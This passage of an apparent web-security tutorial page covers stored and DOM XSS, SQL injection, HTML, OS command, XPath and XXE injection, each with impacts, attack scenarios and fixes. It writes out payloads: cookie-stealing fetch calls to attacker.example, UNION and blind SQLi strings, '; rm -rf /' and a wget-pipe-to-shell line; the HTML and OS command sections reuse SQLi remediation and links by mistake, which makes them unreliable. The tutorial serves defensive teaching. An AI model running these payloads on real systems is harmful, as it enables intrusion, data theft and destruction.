                <h3>üìö Reference Links:</h3>
                <p><a href="https://owasp.org/www-community/attacks/xss/">https://owasp.org/www-community/attacks/xss/</a></p>
                <p><a href="https://web.dev/articles/csp">https://web.dev/articles/csp</a></p>
                <p><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">https://portswigger.net/web-security/cross-site-scripting/reflected</a></p>
            </div>
        </div>

        <!-- Topic 6: Stored Cross-Site Scripting -->
            <div id="stored-cross-site-scripting" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>6. Stored Cross-Site Scripting</h2>
                </div>
                
                <h3>üß© Stored XSS:</h3>
                <p>Stored (persistent) Cross-Site Scripting happens when an application saves attacker-controlled input (in a database, message board, user profile, comment, etc.) and later serves that input back to other users without proper escaping or sanitization.</p>
                <p>When victims load the page that contains the stored payload, the malicious script runs in their browser as if it came from the trusted site.</p>
                <p>Key difference from reflected XSS: <b>the malicious script is stored on the server</b> and can affect every visitor who views the stored content.</p>
                
                <div class="example-box">
                    <h3>‚úÖ Concrete vulnerable vs fixed examples</h3>
                    <p>Vulnerable (simple PHP example ‚Äî DO NOT DO THIS)</p>
                    <img src="Images/Stored XSS-1.png" width="100%" height="auto">
<p>If $comment_from_db contains <script>"..."</script> it will run in users' browsers.</p>
<p>Fixed (escape output)</p>
<p>Using PHP with htmlspecialchars() when rendering:</p>
<img src="Images/Stored XSS-2.png" width="100%" height="auto">
<p>If allowing HTML (example using DOMPurify on input or output)</p>
<p>Sanitize allowed tags/attributes before storing or before sending to client:</p>
<pre>
// client-side example (also sanitize on server)
let clean = DOMPurify.sanitize(userHtml, {ALLOWED_TAGS: ['b','i','a','p','br']});
</pre>
<p>Prefer server-side sanitization as attackers can bypass client-side controls.</p>

                <div class="warning-box">
                    <h3>üí• Impact of the Issue</h3>
                    <p><b>Session hijacking:</b> steal cookies or auth tokens (unless HttpOnly/protected).</p>
                    <p><b>Account takeover:</b> perform actions as the victim (change password, transfer money).</p>
                    <p><b>Persistent phishing:</b> show fake login forms inside the trusted site.</p>
                    <p><b>Malware delivery:</b> inject scripts that download/execute malware.</p>
                    <p><b>Data leakage:</b> read and exfiltrate data visible to the user.</p>
                    <p><b>Reputation damage:</b> site appears compromised to all users.</p>
                </div>
                <p>Severity is often high because attacks can scale and persist until the stored payload is removed.</p>
                
                <div class="attack-scenario-box">
                    <h3>üß™ Attack scenarios</h3>
                    <b>Scenario A ‚Äî Malicious comment on a blog</b>
                    <p>An attacker posts a comment:</p>
                    <img src="Images/Stored XSS-3.png" width="100%" height="auto">
<!-- Great post! <script>fetch('https://attacker.example/steal?c='+document.cookie)</script> -->
                    <p>If the site stores that comment and later renders it unsafely on the article page, every visitor‚Äôs browser executes the script and sends cookies to the attacker.</p>
                    <b>Scenario B ‚Äî Stored payload in user profile</b>
                    <p>A user updates their profile bio with:</p>
<!-- <img src=x onerror="location='https://attacker.example/phish?u='+encodeURIComponent(document.location)"> -->
                    <img src="Images/Stored XSS-4.png" width="100%" height="auto">
                    <p>When other users view the attacker‚Äôs profile page, the onerror runs and redirects or captures data.</p>
                    <b>Scenario C ‚Äî WYSIWYG input (forum post)</b>
                    <p>A forum allows some HTML formatting but fails to sanitize attributes. Attacker saves:</p>
<!-- <a href="#" onclick="fetch('https://attacker/steal?d='+document.documentElement.innerHTML)">click</a> -->
                    <img src="Images/Stored XSS-4.png" width="100%" height="auto">
                    <p>Visitors clicking or (if inline event handlers fire on load due to bug) simply viewing the post can leak data.</p>
                </div>

                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation (How to Fix It)</h3>
                    <b>1. Escape output (contextual encoding)</b>
                    <p>Always encode user data when rendering it in HTML, attributes, JavaScript contexts, CSS, or URLs. The correct encoding depends on where the data is inserted:</p>
                    <p>HTML body: escape <, >, &, " etc.</p>
                    <p>HTML attribute: additionally escape quotes.</p>
                    <p>JavaScript context: use JS string escaping or avoid embedding untrusted data into script blocks.</p>
                    <p>URL context: percent-encode.</p>
                    <b>2. Use safe templating or frameworks</b>
                    <p>Use template engines or frameworks that automatically escape outputs (React, Angular, Django templates, Thymeleaf, etc.) and prefer data binding over manual concatenation.</p>
                    <b>3. Sanitize rich HTML carefully</b>
                    <p>If the app must accept HTML (WYSIWYG editors, user bios), sanitize allowed tags/attributes using a well-maintained library (e.g., DOMPurify for browser side, Bleach for Python, OWASP Java HTML Sanitizer). Prefer whitelisting allowed tags and attributes.</p>
                    <b>4. IInput validation and length limits</b>
                    <p>Validate input for expected types and sizes. Don‚Äôt rely on validation alone ‚Äî always escape output.</p>
                    <b>5. Content Security Policy (CSP)</b>
                    <p>Use CSP to restrict sources of executable scripts (e.g., disallow inline scripts, allow only trusted script hosts). CSP is a mitigation layer ‚Äî not a replacement for proper escaping.</p>
                    <b>6. HttpOnly / Secure / SameSite cookies</b>
                    <p>Mark authentication cookies as HttpOnly, Secure, and SameSite so JavaScript can‚Äôt easily read them and to reduce session theft.</p>
                    <b>7. Use secure headers</b>
                    <p>Set X-Content-Type-Options: nosniff, Referrer-Policy, and others as appropriate.</p>
                    <b>8. Remove/clean stored payloads and monitor</b>
                    <p>Log and scan stored content for suspicious scripts; remove malicious entries. Use WAFs and intrusion detection as extra layers.</p>
                </div>
                                
                <h3>üìö Reference Links:</h3>
                <p><a href="https://owasp.org/www-community/attacks/xss/">https://owasp.org/www-community/attacks/xss/</a></p>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></p>
                <p><a href="https://portswigger.net/web-security/cross-site-scripting/stored">https://portswigger.net/web-security/cross-site-scripting/stored</a></p>
                <p><a href="https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting">https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting</a></p>
                <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP">https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP</a></p>
            </div>
        </div>

           <!-- Topic 7: DOM-based Cross-Site Scripting (XSS) -->
            <div id="dom-cross-site-scripting" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>7. DOM-based Cross-Site Scripting (XSS)</h2>
                </div>
                
                <h3>üåê DOM-based XSS:</h3>
                <p>A DOM-based Cross-Site Scripting (XSS) vulnerability happens when malicious input is executed directly in the browser‚Äôs Document Object Model (DOM) via insecure client-side JavaScript. Unlike traditional XSS, the payload may never reach the server, making detection harder.</p>
                <p>DOM-based XSS occurs when JavaScript on the client side dynamically updates the page using unsanitized user input.</p>
                <b>Difference from other XSS:</b>
                <p><b>Stored XSS:</b> Payload saved on the server and shown to users later.</p>
                <p><b>Reflected XSS:</b> Payload sent to the server and reflected back in the response.</p>
                <p><b>DOM-based XSS:</b> Payload is processed entirely in the browser‚Äôs DOM without server involvement.</p>
                <b>Example:</b>
                <img src="Images/Dom-XSS-2.png" width="100%" height="auto">

                <div class="warning-box">
                    <h3>üí• Impact of the Issue</h3>
                    <p><b>Session Hijacking:</b> Steal cookies or tokens to impersonate users.</p>
                    <p><b>Data Theft:</b> Extract sensitive information from web pages.</p>
                    <p><b>Phishing & Defacement:</b> Inject fake login forms or misleading content.</p>
                    <p><b>Malware Delivery:</b> Redirect users to malicious sites or load malware scripts.</p>
                    <p><b>Bypassing Security Tools:</b> Since payloads may not hit the server, traditional firewalls and logs may miss them.</p>
                </div>
                
                <div class="attack-scenario-box">
                    <h3>üé≠ Attacker Scenarios & Examples</h3>
                    <img src="Images/Dom-XSS-2.png" width="100%" height="auto">
                    <p><b>Phishing Attack:</b> Injects fake login form via DOM manipulation.</p>
                    <p><b>Malvertising:</b> Injects malicious ads into the page using unsanitized query parameters.</p>
                    <p><b>Real-World Example:</b> DOM-based XSS has been found in search bars, comment sections, and URL fragments where JavaScript directly processes user input without sanitization.</p>
                </div>

                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation Strategies</h3>
                    <p><b>Sanitize Input:</b> Use libraries like DOMPurify to clean user-supplied HTML/JS.</p>
                    <p><b>Avoid Dangerous Functions:</b> Don‚Äôt use document.write(), innerHTML, or eval() with untrusted input.</p>
                    <p><b>Use Safe APIs:</b> Prefer textContent or innerText to insert user data safely.</p>
                    <p><b>Content Security Policy (CSP):</b> Restrict script execution sources.</p>
                    <p><b>Regular Testing:</b> Include DOM-based XSS checks in penetration testing.</p>
                    <p><b>Framework Security Features:</b> Use modern frameworks (React, Angular) that auto-escape user input.</p>
                </div>
                                
                <h3>üìö Reference Links:</h3>
                <p><a href="https://www.geeksforgeeks.org/javascript/dom-based-cross-site-scripting-attack-in-depth/">https://www.geeksforgeeks.org/javascript/dom-based-cross-site-scripting-attack-in-depth/</a></p>
                <p><a href="https://pentest-tools.com/blog/xss-attacks-practical-scenarios">https://pentest-tools.com/blog/xss-attacks-practical-scenarios</a></p>
                <p><a href="https://brightsec.com/blog/xss-attack/">https://brightsec.com/blog/xss-attack/</a></p>
            </div>

        <!-- Topic 8: SQL Injection -->
            <div id="sql-injection" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>8. SQL Injection (SQLi)</h2>
                </div>
                
                <h3>üß© SQL Injection (SQLi):</h3>
                <p>SQL Injection (SQLi) is a vulnerability that happens when an application builds a database query using untrusted user input without safely handling it. An attacker supplies crafted input that changes the intended SQL statement, allowing them to read, modify, or destroy data ‚Äî or sometimes execute commands on the database server.</p>
                <div class="example-box">
                    <h3>Main types of SQL Injection (simple descriptions + what they let an attacker do)</h3>
                    <b>1. In-band SQLi (Classic)</b>
                    <p><b>Union-based:</b> attacker uses UNION to append attacker-controlled query results to the app‚Äôs results.</p>
                    <p><b>Error-based:</b> attacker forces database errors that reveal data.</p>
                    <p><b>When used:</b> when application returns query results or error messages directly.</p>
                    <b>2. Inferential (Blind) SQLi</b>
                    <p><b>Boolean-based (content-based) blind:</b> attacker sends queries that return different page content depending on a true/false condition; attacker infers data.</p>
                    <p><b>Time-based blind:</b> attacker forces a delay (e.g., SLEEP) to infer true/false from response time.</p>
                    <p><b>When used:</b> when the app does not return query output or errors.</p>
                    <b>3. Out-of-band (OOB) SQLi</b>
                    <p>Uses DB features to make outbound requests (DNS/HTTP) to attacker-controlled servers to exfiltrate data.</p>
                    <p><b>When used:</b> when direct or blind channels are blocked but outbound network from DB is allowed.</p>
                    <b>4. Second-order SQLi</b>
                    <p>Malicious input is stored safely at entry but later used unsafely (concatenated into SQL) in another operation; exploit happens later.</p>
                <div class="warning-box">
                    <h3>üí• Impact of the Issue</h3>
                    <p><b>Data theft:</b> user data, PII, credit cards, internal tables.</p>
                    <p><b>Authentication bypass:</b> log in as other users.</p>
                    <b>Data tampering or deletion.</b>
                    <p><b>Remote code execution / server compromise</b> (possible with certain DB features).</p>
                    <p><b>Lateral movement:</b> obtain DB credentials and pivot to internal systems.</p>
                    <p><b>Service outage / DoS</b> via expensive queries.</p>
                    <p>Compliance, financial & reputation damage.</p>
                </div>
                
                <div class="attack-scenario-box">
                    <h3>üß™ Attack scenarios and examples ‚Äî one per type (concrete payloads & explanation)</h3>
                    <p>Example vulnerable pattern used in several scenarios:</p>
<pre>
-- vulnerable pseudo-code
query = "SELECT * FROM products WHERE id = " + user_input;
</pre>
                    <b>1. In-band ‚Äî UNION-based (data extraction)</b>
                    <p><b>Scenario:</b> Product page shows query results from products.</p>
                    <p><b>Attack payload:</b> id=10 UNION SELECT 1, username, password FROM users-- -</p>
                    <p><b>What happens:</b> The app‚Äôs response now includes rows from users because UNION appends results.</p>
                    <p><b>Goal:</b> Harvest usernames, hashes, emails.</p>
                    <p><b>Prevention:</b> Use parameterized queries; never build SQL by concatenating user input.</p>
                    <p>Safe replacement example (Node.js, mysql2):</p>
<pre>
const [rows] = await conn.execute('SELECT * FROM products WHERE id = ?', [id]);
</pre>
                    <p>2. In-band ‚Äî Error-based (reveal metadata)</p>
                    <p><b>Scenario:</b> App displays DB error messages in responses (development-like behavior).</p>
                    <b>Attack payload (MySQL-like):</b>
<pre>
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- -
</pre>
                    <p><b>What happens:</b> Crafted subquery induces a DB error containing the concatenated data (e.g., DB name); attacker reads the error.</p>
                    <p><b>Goal:</b> Learn DB name, structure, craft further attacks.</p>
                    <p><b>Prevention:</b> Hide DB errors from users; parameterize queries; limit error detail.</p>
                    <p>3. Inferential ‚Äî Boolean-based blind (bit-by-bit extraction)</p>
                    <p><b>Scenario: App returns identical page for many inputs and shows no errors.</b></p>
                    <p><b>Attack method: Send queries that return different page content when a condition is true.</b></p>
                    <b>Example payload to test first character of admin‚Äôs password:</b>
<pre>
?id=1 AND (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a')
</pre>
                    <p>If response indicates true, attacker knows first character is a. Repeat for every character and position.</p>
                    <p><b>Goal:</b> Recover password hash or other values without direct output.</p>
                    <p><b>Prevention:</b> Parameterized queries, least privilege, rate limiting, monitoring.</p>
                    <b>4. Inferential ‚Äî Time-based blind (using delay)</b>
                    <p><b>Scenario:</b> App response body is constant, but response time can reveal truth.</p>
                    <b>Attack payload (MySQL):</b>
<pre>
?id=1 AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97, SLEEP(5), 0) -- -
</pre>
                    <p>If response is delayed ~5s, first character is a. Repeat to extract values.</p>
                    <p><b>Goal:</b> Same as boolean-blind, but via timing.</p>
                    <p><b>Prevention:</b> Parameterized queries; detect unusual repeated delayed responses; block long-running queries.</p>
                    <b>5. Out-of-band (OOB) ‚Äî DNS/HTTP exfiltration</b>
                    <p><b>Scenario:</b> DB server can perform network requests (DNS/HTTP) and attacker controls a domain attacker.com.</p>
                    <p><b>Attack idea (conceptual):</b> Use a DB function to cause a DNS lookup to secret.[exfil].attacker.com where secret is data from the DB. Attack monitors DNS logs and captures the secret.</p>
                    <p><b>Concrete functions vary by DB:</b> e.g., xp_dirtree/xp_cmdshell on SQL Server, UTL_HTTP on Oracle, DNS functions or LOAD_FILE/LOCAL INFILE combos on MySQL (or user-defined functions).</p>
                    <p><b>Goal:</b> Exfiltrate data when in-band channels are closed.</p>
                    <p><b>Prevention:</b> Disable outbound DNS/HTTP from DB servers, restrict DB functions, network egress filtering, least privilege.</p>
                    <b>6. Second-order SQLi (stored payload triggers later)</b>
                    <p><b>Scenario:</b> User inputs a profile bio that contains '); DROP TABLE users; -- and it is stored. Later, the application builds an admin query by concatenating that stored bio into SQL; the stored malicious string then executes.</p>
                    <p><b>Attack flow:</b> Input is stored -> later used in unsafe SQL -> SQL executes.</p>
                    <p><b>Goal:</b> Attack high-privilege operations via stored input.</p>
                    <p><b>Prevention:</b> Always treat stored data as untrusted; use parameterized queries everywhere; code review for any place that reads stored values into SQL.</p>
                    <h3>Quick code examples ‚Äî safe patterns</h3>
<b>PHP (PDO)</b>
<pre>
$stmt = $pdo->prepare('SELECT id, name FROM users WHERE id = :id');
$stmt->execute([':id' => $id]);
</pre>
<b>Python (psycopg2)</b>
<pre>cur.execute("SELECT id, name FROM users WHERE id = %s", (user_id,))</pre>
<b>Node.js (mysql2/promise)</b>
<pre>const [rows] = await conn.execute('SELECT * FROM users WHERE id = ?', [id]);</pre>
<b>C# (ADO.NET)</b>
<pre>
var cmd = new SqlCommand("SELECT * FROM users WHERE id=@id", conn);
cmd.Parameters.AddWithValue("@id", id);
</pre>
                </div>

                <div class="remediation-box">
                    <h3>üõ† Remediation</h3>
                    <p></p><b>1. Use parameterized queries / prepared statements</b> (primary defense).</p>
                    <p><b>2. Use strong password hashing</b> (bcrypt/Argon2) ‚Äî never store plaintext.</p>
                    <p><b>3. Principle of least privilege:</b> DB account used by the app should have only necessary rights.</p>
                    <p><b>4. Input validation with allowlists</b> (type/format/length) ‚Äî helpful but not sufficient.</p>
                    <p><b>5. Avoid dynamic SQL and string concatenation; </b>if you must build identifiers dynamically, use strict allowlists/whitelists.</p>
                    <p><b>6. Suppress detailed DB errors to users;</b> log internally.</p>
                    <p><b>7. Disable or restrict dangerous DB features</b> (e.g., external network access, xp_cmdshell, UDFs) where possible.</p>
                    <p><b>8. Automated + manual security testing (authorized):</b> include SQLi tests in CI or pentests.</p>
                    <p><b>9. Monitor & alert</b> for anomalous queries, slow queries, or unexpected outbound DNS/HTTP from DB.</p>
                </div>

                <h3>üìö Reference Links:</h3>
                <p><a href="https://owasp.org/www-community/attacks/SQL_Injection">https://owasp.org/www-community/attacks/SQL_Injection</a></p>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</a></p>
                <p><a href="https://cwe.mitre.org/data/definitions/89.html">https://cwe.mitre.org/data/definitions/89.html</a></p>
                <p><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
            </div>
            </div>


        <!-- Topic 9: HTML Injection -->
            <div id="html-injection" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>9. HTML Injection</h2>
                </div>
                
                <h3>üß© HTML Injection:</h3>
                <p>HTML Injection occurs when an application inserts user-supplied data directly into a web page as HTML (not escaped), letting an attacker inject tags, attributes, or markup that change page content or behavior. When that injected HTML can execute script, it becomes XSS (Cross-Site Scripting).</p>
                <div class="example-box">
                    <h3>Main types of HTML Injection</h3>
                    <p><b>1. Reflected</b> ‚Äî injection appears immediately in the HTTP response (e.g., search pages).</p>
                    <p><b>2. Stored (persistent)</b> ‚Äî malicious HTML is saved (comments, profiles) and served to other users. (Higher impact.)</p>
                    <p><b>3. DOM-based</b> ‚Äî client-side JavaScript inserts untrusted input into the DOM (e.g., innerHTML) causing injection.</p>
                    <p><b>4. Markup-only (non-script)</b> ‚Äî no JS, but attackers can manipulate layout or create fake UI elements (still dangerous).</p>
                <div class="warning-box">
                    <h3>üí• Impact of the Issue</h3>
                    <p><b>Script execution (XSS)</b> ‚Üí steal cookies, tokens, or perform actions as the victim.</p>
                    <p><b>Credential theft / account takeover</b> via stolen session tokens or fake login forms.</p>
                    <p><b>UI spoofing / phishing</b> ‚Äî show fake forms or messages on trusted pages.</p>
                    <p><b>Data exfiltration</b> ‚Äî send user data to attacker endpoints.</p>
                    <p><b>Content defacement</b> ‚Äî change what users see.</p>
                    <p><b>Combined attacks</b> ‚Äî CSRF, privilege escalation, or persistence via stored injections.</p>
                    <p><b>Compliance/reputation damage</b> if user data leaks or site is defaced.</p>
                </div>
                <p>Severity depends on whether "script/event" handlers are allowed and what sensitive actions are available.</p>
                
                <div class="attack-scenario-box">
                    <h3>üß™ Typical attack scenarios & concrete examples</h3>
                    <p>Examples are for defensive learning only.</p>
                    <b>1. Stored HTML Injection ‚Äî forum comment</b>
                    <p>Vulnerable flow: app saves comment without escaping and later renders it.</p>
                    <p>Stored payload:</p>
                    <img src="Images/html-1.png" width="100%" height="auto">
                    <p><b>Result:</b> Visitors‚Äô browsers run the script and leak cookies.</p>
                    <p><b>Impact:</b> session theft, account takeover.</p>
                    <b>2. Reflected HTML Injection ‚Äî search page</b>
                    <p>Vulnerable code (pseudo):</p>
                    <img src="Images/html-2.png" width="100%" height="auto">
                    <p><b>Result:</b> Clicking the crafted link executes script in the browser immediately.</p>
                    <b>3. DOM-based HTML Injection ‚Äî client-side insertion</b>
                    <p>Vulnerable JS:</p>
                    <img src="Images/html-3.png" width="100%" height="auto">
                    <p><b>Result:</b> script runs entirely via client-side DOM manipulation.</p>
                    <b>4. Markup-only UI spoof (no script)</b>
                    <p>Stored payload:</p>
                    <img src="Images/html-4.png" width="100%" height="auto">
                    <p><b>Result: </b>Victims see a fake login embedded in a trusted page and submit credentials to attacker.</p>
                    <b>5. Attribute abuse</b>
                    <p>Payload:</p>
                    <img src="Images/html-5.png" width="100%" height="auto">
                </div>

                <div class="remediation-box">
                    <h3>üõ† Remediation</h3>
                    <p></p><b>1. Use parameterized queries / prepared statements</b> (primary defense).</p>
                    <p><b>2. Use strong password hashing</b> (bcrypt/Argon2) ‚Äî never store plaintext.</p>
                    <p><b>3. Principle of least privilege:</b> DB account used by the app should have only necessary rights.</p>
                    <p><b>4. Input validation with allowlists</b> (type/format/length) ‚Äî helpful but not sufficient.</p>
                    <p><b>5. Avoid dynamic SQL and string concatenation; </b>if you must build identifiers dynamically, use strict allowlists/whitelists.</p>
                    <p><b>6. Suppress detailed DB errors to users;</b> log internally.</p>
                    <p><b>7. Disable or restrict dangerous DB features</b> (e.g., external network access, xp_cmdshell, UDFs) where possible.</p>
                    <p><b>8. Automated + manual security testing (authorized):</b> include SQLi tests in CI or pentests.</p>
                    <p><b>9. Monitor & alert</b> for anomalous queries, slow queries, or unexpected outbound DNS/HTTP from DB.</p>
                </div>

                <h3>üìö Reference Links:</h3>
                <p><a href="https://owasp.org/www-community/attacks/SQL_Injection">https://owasp.org/www-community/attacks/SQL_Injection</a></p>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</a></p>
                <p><a href="https://cwe.mitre.org/data/definitions/89.html">https://cwe.mitre.org/data/definitions/89.html</a></p>
                <p><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
            </div>
        </div>

        <!-- Topic 10: OS Command Injection -->
            <div id="os-command-injection" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>10. OS Command Injection</h2>
                </div>
                
                <h3>üñ•Ô∏è OS Command Injection</h3>
                <p>An OS Command Injection vulnerability happens when an application takes user input and passes it directly to the operating system‚Äôs command shell without proper validation. Attackers can exploit this to run arbitrary commands, steal data, or fully compromise the server.</p>
                <p>Also known as shell injection, it occurs when user input is concatenated into system-level commands.</p>
                <p>Lack of input validation or unsafe use of functions like system(), exec(), or backticks in code.</p>
                <b>Example:</b>
<pre>
http://example.com/ping?host=127.0.0.1; rm -rf /  
</pre>
                <p>The ; rm -rf / part is injected into the OS command, potentially deleting files.</p>

                <div class="warning-box">
                    <h3>üí• Impact of the Issue</h3>
                    <p><b>Data Breach:</b> Attackers can read sensitive files (e.g., /etc/passwd, database configs).</p>
                    <p><b>System Takeover:</b> Arbitrary commands allow privilege escalation and remote control.</p>
                    <p><b>Denial of Service (DoS):</b> Malicious commands can crash or overload the server.</p>
                    <p><b>Pivoting:</b> Attackers can use the compromised server to attack other systems in the network.</p>
                </div>
                
                <div class="attack-scenario-box">
                    <h3>üé≠ Attacker Scenarios & Examples</h3>
                    <p><b>File Disclosure:</b> Attacker injects ; cat /etc/passwd to read system user info.</p>
                    <p><b>Remote Control:</b> Injecting ; wget http://malicious.com/malware.sh | sh downloads and executes malware.</p>
                    <p><b>Privilege Escalation:</b> Exploiting weak configurations to run commands as root.</p>
                    <p><b>Real-World Example:</b> OS command injection has been found in vulnerable web apps where user-supplied parameters (like filenames or IP addresses) were passed directly to shell commands without sanitization.</p>
                </div>

                <div class="remediation-box">
                    <h3>üõ† Remediation</h3>
                    <p><b>1. Input Validation:</b> Strictly validate and sanitize user input.</p>
                    <p><b>2. Avoid Direct OS Calls:</b> Use safe APIs or libraries instead of executing shell commands.</p>
                    <p><b>3. Parameterized Functions:</b> Where possible, use functions that separate logic from input (e.g., prepared statements for DB).</p>
                    <p><b>4. Least Privilege:</b> Run applications with minimal OS permissions.</p>
                    <p><b>5. Escaping & Encoding:</b> Properly escape special characters if commands are unavoidable.</p>
                    <p><b>6. Security Testing:</b> Regular penetration testing and code reviews to catch unsafe command usage.</p>
                </div>

                <h3>üìö Reference Links:</h3>
                <p><a href="https://owasp.org/www-community/attacks/SQL_Injection">https://owasp.org/www-community/attacks/SQL_Injection</a></p>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</a></p>
                <p><a href="https://cwe.mitre.org/data/definitions/89.html">https://cwe.mitre.org/data/definitions/89.html</a></p>
                <p><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
        </div>


    <!-- Topic 11: XPath Command Injection -->
            <div id="xpath-injection" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>11. XPath Injection</h2>
                </div>
                
                <h3>üìÇ XPath Injection</h3>
                <p>An XPath Injection vulnerability occurs when user input is unsafely included in an XPath query used to search XML data. Attackers can manipulate the query to bypass authentication, extract sensitive data, or alter application logic. The fix is input validation, parameterized queries, and avoiding direct concatenation of user input into XPath expressions.</p>
                <p>XPath is a query language for XML documents. XPath Injection happens when an application builds XPath queries using unsanitized user input.</p>
                <p>Similar to SQL Injection, but targeting XML data sources instead of databases.</p>
                <b>Example:</b>
<pre>
//users/user[username/text()='admin' and password/text()='1234'] 
</pre>
<p>If input is not sanitized, an attacker could enter:</p>
<pre>
' or '1'='1
</pre>
                <p>This changes the query logic to always return true, bypassing authentication.</p>

                <div class="warning-box">
                    <h3>üí• Impact of the Issue</h3>
                    <p><b>Authentication Bypass:</b> Attackers log in without valid credentials.</p>
                    <p><b>Data Exposure:</b> Sensitive XML data (usernames, passwords, IDs) can be extracted.</p>
                    <p><b>Privilege Escalation:</b> Attackers may gain admin-level access.</p>
                    <p><b>Application Manipulation:</b> Business logic relying on XML queries can be altered.</p>
                    <p><b>Regulatory Risk:</b> Exposure of personal data can lead to compliance violations.</p>
                </div>
                
                <div class="attack-scenario-box">
                    <h3>üé≠ Attacker Scenarios & Examples</h3>
                    <p><b>Login Bypass:</b> Attacker enters ' or '1'='1 in the password field, gaining access without knowing the real password.</p>
                    <p><b>Data Harvesting:</b> Injecting queries to list all usernames and passwords stored in XML.</p>
                    <p><b>Privilege Escalation:</b> Manipulating queries to return admin accounts instead of normal users.</p>
                    <p><b>Real-World Example:</b> Applications using XML for configuration or authentication (e.g., legacy systems, SAML-based apps) have been found vulnerable when developers directly concatenate user input into XPath queries.</p>
                </div>

                <div class="remediation-box">
                    <h3>üõ† Remediation</h3>
                    <p><b>1. Parameterized Queries:</b> Use APIs or libraries that separate query logic from user input.</p>
                    <p><b>2. nput Validation & Sanitization:</b>I Reject or escape special characters (', ", //, []).</p>
                    <p><b>3. Least Privilege:</b> Restrict XML data access to only what‚Äôs necessary.</p>
                    <p><b>4. Error Handling:</b> Avoid detailed error messages that reveal query structure.</p>
                    <p><b>5. Security Testing:</b> Include XPath Injection checks in penetration tests.</p>
                </div>

                <h3>üìö Reference Links:</h3>
                <p><a href="https://learn.snyk.io/lesson/xpath-injection/?ecosystem=javascript">https://learn.snyk.io/lesson/xpath-injection/?ecosystem=javascript</a></p>
                <p><a href="https://www.imperva.com/learn/application-security/xpath-injection/">https://www.imperva.com/learn/application-security/xpath-injection/</a></p>
                <p><a href="https://www.geeksforgeeks.org/ethical-hacking/xpath-injection/">https://www.geeksforgeeks.org/ethical-hacking/xpath-injection/</a></p>
        </div>

        <!-- Topic 12: XXE Injection -->
            <div id="xml-injection" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>12. XML External Entity (XXE) Injection</h2>
                </div>
                
                <h3>üß© XML External Entity (XXE) Injection</h3>
                <p>An XXE (XML External Entity) vulnerability occurs when an application processes untrusted XML input and allows attackers to inject malicious XML entities. This can lead to sensitive file disclosure, denial of service, SSRF (Server-Side Request Forgery), or even remote code execution. The fix is to disable external entity processing in XML parsers and validate all XML input.</p>
                <p>XML External Entity (XXE) Injection is a vulnerability in applications that parse XML.</p>
                <p>XML allows defining entities (shortcuts for data). If external entities are enabled, attackers can reference local files or remote resources.</p>
                <p>Example of a malicious XML payload:</p>
                <img src="Images/XXE-1.png" width="750" height="180">
                <p>Here, the entity &xxe; will include the contents of /etc/passwd.</p>

                <div class="warning-box">
                    <h3>üí• Impact of XXE</h3>
                    <p><b>Sensitive File Disclosure:</b> Read files like /etc/passwd, configuration files, or API keys.</p>
                    <p><b>Server-Side Request Forgery (SSRF):</b> Force the server to make requests to internal systems.</p>
                    <p><b>Denial of Service (DoS):</b> Use recursive entities (the ‚ÄúBillion Laughs‚Äù attack) to exhaust memory/CPU.</p>
                    <p><b>Remote Code Execution (in some cases):</b> If combined with other flaws, attackers may execute arbitrary code.</p>
                    <p><b>Data Exfiltration:</b> Steal credentials, tokens, or internal documents.</p>
                </div>
                
                <div class="attack-scenario-box">
                    <h3>üéØ Attack Scenarios</h3>
                    <b>1. File Disclosure Attack</b>
                    <p>Attacker submits XML referencing /etc/passwd ‚Üí server returns sensitive system data.</p>
                    <b>SSRF via XXE</b>
                    <img src="Images/XXE-2.png" width="750" height="60">
                    <p>Forces the server to fetch internal resources attackers can‚Äôt normally access.</p>
                    <b>Denial of Service (Billion Laughs Attack)</b>
                    <img src="Images/XXE-3.png" width="750" height="180">
                    <p>Expands exponentially, crashing the server.</p>
                </div>

                <div class="remediation-box">
                    <h3>üõ† Remediation</h3>
                    <b>1. Disable External Entities</b>
                    <p>In XML parsers, disable DOCTYPE and external entity resolution.</p>
                    <p>Example (Java):</p>
<pre>
